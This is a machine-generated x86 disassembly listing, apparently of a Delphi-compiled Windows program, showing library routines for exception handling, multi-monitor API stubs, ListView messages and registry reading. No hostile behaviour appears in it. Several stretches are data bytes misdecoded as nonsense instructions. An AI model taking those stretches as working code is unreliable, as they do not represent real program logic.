push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_3a65720
xor eax eax
push ebp
push sub_3a85ea2
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax esi
dec ax
je r-xdata
lea eax [ ebx + 0x20 ]
mov edx [ ebp - 0x4 ]
call sub_3a652f4
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov eax ebx
call sub_3a85a1c
jmp r-xdata
dec ax
je r-xdata
mov bl 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a85ea9
mov eax ebx
call sub_3a85480
jmp r-xdata
dec ax
je r-xdata
mov eax ebx
call sub_3a854b0
jmp r-xdata
sub ax 0x5
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov eax ebx
call sub_3a85a1c
jmp r-xdata
jmp r-xdata
push esi
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_3a85618
sub_3a85eb4
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x8 ] ebx
mov ebx ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_3a85fd1
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x11 ] 0x0
mov [ ebp - 0x19 ] 0x0
test ebx ebx
je r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0xc ]
add eax 0x20
mov edx ebx
call sub_3a652f4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a85fd8
lea eax [ ebp - 0x8 ]
call sub_3a66cb4
lea eax [ ebp - 0x4 ]
call sub_3a66cb4
retn
inc eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x18 ] 0x0
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x10 ]
mov edx [ ebp - 0x18 ]
call sub_3a7a494
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
call sub_3a66ccc
xor eax eax
push ebp
push sub_3a85fa0
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
call sub_3a66cb4
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_3a6efcc
test al al
je r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x40 ]
mov [ ebp - 0x19 ] al
xor edx edx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov [ ebp - 0x11 ] 0x1
call sub_3a64ce0
jmp r-xdata
retn
movzx edx [ ebp - 0x19 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
sub_3a8600c
push ebx
push esi
push edi
push ebp
mov ebp edx
mov esi eax
mov eax [ esi + 0x14 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ esi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x14 ]
call sub_3a7a494
cmp ebp [ eax + 0x8 ]
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_3a7a494
mov edi eax
cmp ebp [ edi + 0x8 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x14 ]
call sub_3a7a388
jmp r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_3a7a388
mov eax edi
call sub_3a64380
jmp r-xdata
sub_3a8607c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_3a860ad
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a860b4
retn
mov eax rw-data
call sub_3a66cb4
sub_3a860b8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_3a65720
xor eax eax
push ebp
push sub_3a86175
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
movzx eax bl
cmp [ eax + rw-data ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a8617c
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
cmp [ rw-data ] 0x0
je r-xdata
xor esi esi
test bl bl
jne r-xdata
test bl bl
je r-xdata
mov esi edi
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_3a65730
push eax
mov eax [ rw-data ]
push eax
call GetProcAddress
mov esi eax
jmp r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
movzx eax bl
mov [ eax + rw-data ] 0x1
mov [ rw-data ] 0x1
test esi esi
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x4
call sub_3a860b8
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
call sub_3a652a0
sub_3a8619c
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
or eax 0xffffffff
mov edx ebx
add edx 0xffffffb4
sub edx 0x2
jb r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
xor eax eax
call sub_3a860b8
mov [ rw-data ] eax
push ebx
call [ rw-data ]
jmp r-xdata
xor eax eax
jmp r-xdata
je r-xdata
pop ebx
pop ebp
retn 0x4
cmp eax 0xffffffff
jne r-xdata
xor ebx ebx
jmp r-xdata
dec edx
je r-xdata
push ebx
call GetSystemMetrics
mov ebx 0x1
dec edx
sub edx 0x2
jae r-xdata
mov eax 0x1
jmp r-xdata
sub_3a86224
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor esi esi
mov eax edi
and eax 0x3
test al al
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x2
call sub_3a860b8
mov [ rw-data ] eax
push edi
push ebx
call [ rw-data ]
mov esi eax
jmp r-xdata
mov esi 0x12340042
cmp [ ebx + 0x8 ] 0x0
jle r-xdata
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
cmp [ ebx + 0xc ] 0x0
jle r-xdata
push 0x0
call [ rw-data ]
cmp eax [ ebx ]
jle r-xdata
push 0x1
call [ rw-data ]
cmp eax [ ebx + 0x4 ]
jle r-xdata
sub_3a862b4
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
mov eax ebx
and eax 0x3
test al al
je r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x1
call sub_3a860b8
mov [ rw-data ] eax
push ebx
push esi
call [ rw-data ]
jmp r-xdata
push esi
call IsIconic
test eax eax
je r-xdata
mov eax 0x12340042
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
lea eax [ ebp - 0x10 ]
push eax
push esi
call GetWindowRect
lea eax [ ebp - 0x2c ]
push eax
push esi
call GetWindowPlacement
jmp r-xdata
push ebx
lea eax [ ebp - 0x10 ]
push eax
call sub_3a86224
sub_3a8634a
add [ eax ] al
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
mov eax edi
and eax 0x3
test al al
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x3
call sub_3a860b8
mov [ rw-data ] eax
push edi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov ebx 0x12340042
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
push 0x0
call [ rw-data ]
cmp esi eax
jge r-xdata
cmp [ ebp + 0xc ] 0x0
jl r-xdata
push 0x1
call [ rw-data ]
cmp eax [ ebp + 0xc ]
jle r-xdata
sub_3a863cb
call [ eax ]
add [ eax ] al
add [ ebp + 0x6f ] cl
outsb
imul esi [ edi + ebp * 2 + 0x72 ] 0x6d6f7246
push eax
outsd
imul ebp [ esi + 0x74 ] 0x0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x4
call sub_3a860b8
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x48
jb r-xdata
mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_3a864b8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x5
call sub_3a860b8
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x48
jb r-xdata
mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_3a8658c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x6
call sub_3a860b8
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x48
jb r-xdata
mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_3a86660
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x7
call sub_3a860b8
mov [ rw-data ] eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push edi
push esi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
push 0x0
call [ rw-data ]
mov [ ebp - 0x14 ] eax
push 0x1
call [ rw-data ]
mov [ ebp - 0x10 ] eax
test esi esi
je r-xdata
test edi edi
je r-xdata
lea eax [ ebp - 0x2c ]
push eax
push esi
call GetClipBox
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
push esi
call GetDCOrgEx
test eax eax
je r-xdata
mov eax [ ebp + 0x14 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
push esi
push 0x12340042
call [ ebp + 0x10 ]
mov ebx eax
push edi
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
neg eax
push eax
mov eax [ ebp - 0x8 ]
neg eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call OffsetRect
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
je r-xdata
mov bl 0x1
jmp r-xdata
push edi
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
jne r-xdata
test edi edi
je r-xdata
cmp [ ebp - 0xc ] 0x1
jne r-xdata
mov bl 0x1
jmp r-xdata
sub_3a867fb
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_3a86821
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a86828
retn
sub_3a86834
cmp [ rw-data ] 0x0
jne r-xdata
retn
push r-xdata
call GetModuleHandleA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
sub_3a86894
push ebx
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_3a86834
xor eax eax
jmp r-xdata
push ebx
call [ rw-data ]
test eax eax
jne r-xdata
neg al
sbb eax eax
pop ebx
retn
mov al 0x1
sub_3a86984
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
test ebx ebx
je r-xdata
push 0x0
push edi
push 0x100e
push esi
call __imp_SendMessageA
mov eax [ ebp + 0x8 ]
mov [ ebx ] eax
push ebx
push edi
push 0x100e
push esi
call SendMessageA
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_3a869c0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
movzx eax di
or eax 0x0
push eax
push esi
push 0x1013
push ebx
call __imp_SendMessageA
test eax eax
setne al
neg al
sbb eax eax
pop edi
pop esi
pop ebx
retn
sub_3a869ec
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
movzx eax di
or eax 0x0
push eax
push esi
push 0x101e
push ebx
call __imp_SendMessageA
pop edi
pop esi
pop ebx
retn
sub_3a86a0c
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x1c ] ecx
lea eax [ ebp - 0x28 ]
push eax
push esi
push 0x102b
push ebx
call __imp_SendMessageA
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_3a86a3c
add esp 0xffffffd8
mov [ esp + 0x10 ] 0xf000
and ecx 0x1
inc ecx
shl ecx 0xc
mov [ esp + 0xc ] ecx
mov ecx esp
push ecx
push edx
push 0x102b
push eax
call __imp_SendMessageA
add esp 0x28
retn
sub_3a86a68
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebp - 0x20 ] ecx
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x28 ]
push eax
push esi
push 0x102e
push ebx
call __imp_SendMessageA
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_3a86d9f
inc [ ecx ]
add [ eax ] al
add [ ecx ] dh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_3a86de4
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a86deb
retn
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_3a65e38
sub_3a86df4
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp al 0x6e
test al 0x3
or al 0x0
add [ eax ] al
mov [ esi - 0x59ba37fd ] es
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esi [ eax + 0x43 ]
cmpsb [ esi ] [ edi ]
add edx [ edx ]
inc ebp
push edx
imul esi [ gs : bp + di + 0x74 ] 0x78457972
arpl [ ebp + 0x70 ] sp
je r-xdata
jb r-xdata
outsd
outsb
nop
pushfd
outsb
test al 0x3
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushfd
outsb
test al 0x3
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
scasb [ edi ]
outsb
test al 0x3
sbb al 0x0
add [ eax ] al
rcl [ eax ] 0xa6
add ecx eax
inc ebp
cmpsb [ esi ] [ edi ]
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esp [ edi + ebp * 2 - 0x58 ]
add ecx [ esi ]
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x1003a6 ] dl
add [ eax ] al
or [ edx + edx * 2 + 0x65 ] edx
imul esi [ bp + di + 0x74 ] 0x83537972
sub_3a86eb8
push ebx
add esp 0xfffffff8
mov ebx eax
mov [ esp ] ebx
mov [ esp + 0x4 ] 0xb
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d410
call sub_3a64c34
pop ecx
pop edx
pop ebx
retn
sub_3a86ef8
cmp eax 0x1
jne r-xdata
cmp eax 0x2
jne r-xdata
mov al 0x1
retn
cmp eax 0x4
jne r-xdata
mov al 0x2
jmp r-xdata
cmp eax 0x3
jne r-xdata
mov al 0x3
jmp r-xdata
retn
xor eax eax
mov al 0x4
jmp r-xdata
sub_3a86f20
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov edx 0x80000001
mov eax esi
call sub_3a86fc0
mov [ esi + 0x18 ] 0xf003f
mov [ esi + 0xc ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov eax esi
pop esi
pop ebx
retn
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3a86f64
push ebx
push esi
call sub_3a6478c
mov ebx edx
mov esi eax
mov eax esi
call sub_3a86f90
mov edx ebx
and dl 0xfc
mov eax esi
call sub_3a64370
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_3a64734
sub_3a86f90
push ebx
mov ebx eax
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
pop ebx
retn
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax [ ebx + 0x4 ]
push eax
call RegCloseKey
xor eax eax
mov [ ebx + 0x4 ] eax
lea eax [ ebx + 0x10 ]
call sub_3a652a0
push eax
call RegFlushKey
sub_3a86fc0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x8 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x14 ] 0x0
je r-xdata
mov [ ebx + 0x8 ] esi
mov eax ebx
call sub_3a86f90
push eax
call RegCloseKey
mov [ ebx + 0x14 ] 0x0
sub_3a86fec
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_3a86f90
mov [ ebx + 0x4 ] esi
lea eax [ ebx + 0x10 ]
mov edx edi
call sub_3a652f4
pop edi
pop esi
pop ebx
retn
sub_3a87024
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_3a871d5
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_3a65338
mov eax [ ebp - 0x4 ]
call sub_3a86ee4
mov ebx eax
test bl bl
jne r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
mov edi [ esi + 0x18 ]
and edi 0x300
lea eax [ ebp - 0xc ]
push eax
mov eax edi
or eax 0x20019
push eax
push 0x0
mov eax [ ebp - 0x4 ]
call sub_3a65730
push eax
mov edx ebx
mov eax esi
call sub_3a87010
push eax
call RegOpenKeyExA
test eax eax
sete [ ebp - 0x5 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx 0x1
call sub_3a657d8
lea eax [ ebp - 0xc ]
push eax
mov eax edi
or eax 0x20009
push eax
push 0x0
mov eax [ ebp - 0x4 ]
call sub_3a65730
push eax
mov edx ebx
mov eax esi
call sub_3a87010
push eax
call RegOpenKeyExA
test eax eax
sete [ ebp - 0x5 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
or edi 0x20019
mov [ esi + 0x18 ] edi
cmp [ esi + 0x4 ] 0x0
setne al
test al bl
je r-xdata
lea eax [ ebp - 0xc ]
push eax
mov eax edi
or eax 0x1
push eax
push 0x0
mov eax [ ebp - 0x4 ]
call sub_3a65730
push eax
mov edx ebx
mov eax esi
call sub_3a87010
push eax
call RegOpenKeyExA
test eax eax
sete [ ebp - 0x5 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
or edi 0x20009
mov [ esi + 0x18 ] edi
cmp [ esi + 0x4 ] 0x0
setne al
test al bl
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov eax esi
call sub_3a86fec
jmp r-xdata
push [ esi + 0x10 ]
push r-xdata
push [ ebp - 0x4 ]
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_3a65634
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a871dc
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
or edi 0x1
mov [ esi + 0x18 ] edi
cmp [ esi + 0x4 ] 0x0
setne al
test al bl
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov eax esi
call sub_3a86fec
jmp r-xdata
push [ esi + 0x10 ]
push r-xdata
push [ ebp - 0x4 ]
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_3a65634
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov eax esi
call sub_3a86fec
push [ esi + 0x10 ]
push r-xdata
push [ ebp - 0x4 ]
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_3a65634
sub_3a871f4
push ebx
push esi
push edi
push ebp
push ecx
mov ebp ecx
mov edi edx
mov esi eax
mov eax ebp
xor ecx ecx
mov edx 0x8
call sub_3a63a44
lea eax [ ebp + 0x4 ]
push eax
push 0x0
lea eax [ esp + 0x8 ]
push eax
push 0x0
mov eax edi
call sub_3a65730
push eax
mov eax [ esi + 0x4 ]
push eax
call RegQueryValueExA
test eax eax
sete bl
mov eax [ esp ]
call sub_3a86ef8
mov [ ebp ] al
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_3a87244
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
call sub_3a871f4
test al al
je r-xdata
or eax 0xffffffff
mov eax [ esp + 0x4 ]
jmp r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
sub_3a8726c
push ebx
push esi
push edi
push ebp
push ecx
mov edi ecx
mov ebp edx
mov esi eax
mov edx ebp
mov eax esi
call sub_3a87244
mov ebx eax
test ebx ebx
jle r-xdata
mov eax edi
call sub_3a652a0
mov eax edi
mov ecx ebx
xor edx edx
call sub_3a65390
push ebx
lea eax [ esp + 0x4 ]
push eax
mov eax [ edi ]
call sub_3a65730
mov ecx eax
mov edx ebp
mov eax esi
call sub_3a872e4
cmp [ esp ] 0x1
je r-xdata
mov eax [ edi ]
call sub_3a65730
call sub_3a6a120
mov edx eax
mov eax edi
call sub_3a659c0
jmp r-xdata
cmp [ esp ] 0x2
jne r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_3a86eb8
jmp r-xdata
sub_3a872e4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
lea eax [ ebp + 0xc ]
push eax
push edi
lea eax [ ebp - 0x4 ]
push eax
push 0x0
mov eax esi
call sub_3a65730
push eax
mov eax [ ebx + 0x4 ]
push eax
call RegQueryValueExA
test eax eax
je r-xdata
mov ebx [ ebp + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_3a86ef8
mov edx [ ebp + 0x8 ]
mov [ edx ] al
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov [ ebp - 0xc ] esi
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d410
call sub_3a64c34
sub_3a87367
inc [ ecx ]
add [ eax ] al
add [ ecx ] dh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_3a873ac
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a873b3
retn
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_3a65e38
sub_3a873b8
mov esp 0x103a873
push es
push esp
inc ebx
outsd
insb
outsd
jb r-xdata
add [ eax ] al
add [ eax + 0x7fffffff ] al
lea eax [ eax ]
sbb al 0x74
test al 0x3
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb al 0x74
test al 0x3
or al 0x0
add [ eax ] al
mov [ esi - 0x59ba37fd ] es
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
